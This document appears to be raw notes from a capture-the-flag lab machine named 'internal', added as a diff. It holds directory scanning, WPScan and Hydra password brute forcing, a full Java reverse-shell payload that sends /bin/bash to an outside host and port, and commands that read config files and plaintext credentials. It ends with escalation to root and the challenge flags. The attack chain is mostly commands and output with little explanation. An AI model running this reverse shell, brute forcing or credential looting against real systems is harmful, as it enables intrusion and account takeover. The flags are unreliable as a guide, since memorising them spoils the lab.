@@ -1,0 +1,113 @@
+[03:07:41] 403 -  278B  - /.php
+[03:08:44] 301 -  313B  - /blog  ->  http://10.10.212.184/blog/
+[03:08:46] 200 -    2KB - /blog/wp-login.php
+[03:08:47] 200 -   18KB - /blog/
+[03:09:29] 301 -  319B  - /javascript  ->  http://10.10.212.184/javascript/
+[03:09:59] 301 -  319B  - /phpmyadmin  ->  http://10.10.212.184/phpmyadmin/
+[03:10:03] 200 -    3KB - /phpmyadmin/doc/html/index.html
+[03:10:03] 200 -    3KB - /phpmyadmin/index.php
+[03:10:03] 200 -    3KB - /phpmyadmin/
+[03:10:18] 403 -  278B  - /server-status
+[03:10:18] 403 -  278B  - /server-status/
+[03:10:54] 200 -    2KB - /wordpress/wp-login.php
+[03:10:55] 404 -   51KB - /wordpress/
+
+
+[+] admin
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+
+└─$ wpscan --url http://internal.thm/blog --usernames admin -P /home/ed/tools/rockyou.txt
+
+Trying admin / bratz1 Time: 00:12:31 <                     > (3885 / 14348277)  0.02%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: admin, Password: my2boys
+
+python -c "import pty;pty.spawn('/bin/bash')"
+
+/bin/sh: 0: can't access tty; job control turned off
+$ python -c "import pty;pty.spawn('/bin/bash')"
+www-data@internal:/$ ls
+ls
+bin    dev   initrd.img      lib64	 mnt   root  snap      sys  var
+boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
+cdrom  home  lib	     media	 proc  sbin  swap.img  usr  vmlinuz.old
+www-data@internal:/$ cat /etc/passwd | grep bash
+cat /etc/passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
+
+
+www-data@internal:/var/www/html/wordpress$ cat wp-config.php
+
+/** MySQL database username */
+define( 'DB_USER', 'wordpress' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'wordpress123' );
+
+══════════╣ Unexpected in /opt (usually empty)
+total 16
+drwxr-xr-x  3 root root 4096 Aug  3  2020 .
+drwxr-xr-x 24 root root 4096 Aug  3  2020 ..
+drwx--x--x  4 root root 4096 Aug  3  2020 containerd
+-rw-r--r--  1 root root  138 Aug  3  2020 wp-save.txt
+
+www-data@internal:/opt$ cat wp-save.txt
+cat wp-save.txt
+Bill,
+
+Aubreanna needed these credentials for something later.  Let her know you have them and where they are.
+
+aubreanna:bubb13guM!@#123
+
+aubreanna@internal:~$ netstat -tnlp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:34845         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -  
+
+aubreanna@internal:~$ ls
+jenkins.txt  snap  user.txt
+aubreanna@internal:~$ cat user.txt
+THM{int3rna1_fl4g_1}
+
+aubreanna@internal:~$ cat jenkins.txt 
+Internal Jenkins service is running on 172.17.0.2:8080
+
+//for the jenkins login page, hydra it with dict xato 10000   !!!
+
+─$ hydra -s 8822 -l admin -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt  127.0.0.1 http-form-post "/:user=^USER^&pass=^PASS^:F=Invalid username" -vV -f -t 64
+
+String host="10.13.87.102";int port=8823;String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+
+jenkins@jenkins:/opt$ cat note.txt
+cat note.txt
+Aubreanna,
+
+Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
+need access to the root user account.
+
+root:tr0ub13guM!@#123
+aubreanna@internal:~$ su 
+Password: 
+root@internal:/home/aubreanna# cd /root
+root@internal:~# ls
+root.txt  snap
+root@internal:~# cat root.txt 
+THM{d0ck3r_d3str0y3r}
